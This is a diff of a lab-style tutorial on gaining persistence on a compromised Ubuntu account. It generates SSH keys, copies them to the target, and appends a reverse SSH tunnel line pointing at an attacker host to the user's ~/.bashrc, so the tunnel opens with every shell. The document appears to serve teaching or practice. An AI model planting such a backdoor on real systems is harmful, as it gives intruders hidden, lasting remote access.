@@ -6,13 +6,13 @@ In this tutorial, we will modify the bashrc file of a compromised user on the ta
 - An SSH client
 - A user account with permission to edit the user's bashrc file on the target system
 
-# Environment Setup
+# Environment Setup Notes
 - Establish a network connection between the two Ubuntu machines
 - Confirm communication between the machines via ping
 - Ensure that the attackers SSH server is running and properly configured 
 
 # Learner Instructions
-1. On the attacking machine, open the terminal and execute the following command: **`ssh-keygen -t rsa`**. This command will generate a public-private key pair, the key to unlocking the target machine.
+1. On the attacking machine, open the terminal and execute the following command: **`ssh-keygen -t rsa`** . This command will generate a public-private key pair, the key to unlocking the target machine.
 2. Utilize the following command to copy the public key from the attacking machine to the target machine: **`ssh-copy-id <username>@<target_machine_IP>`**. Replace **`<username>`** with the username of the user account on the target machine and **`<target_machine_IP>`** with the IP address of the target machine.
 3. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
 4. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine.
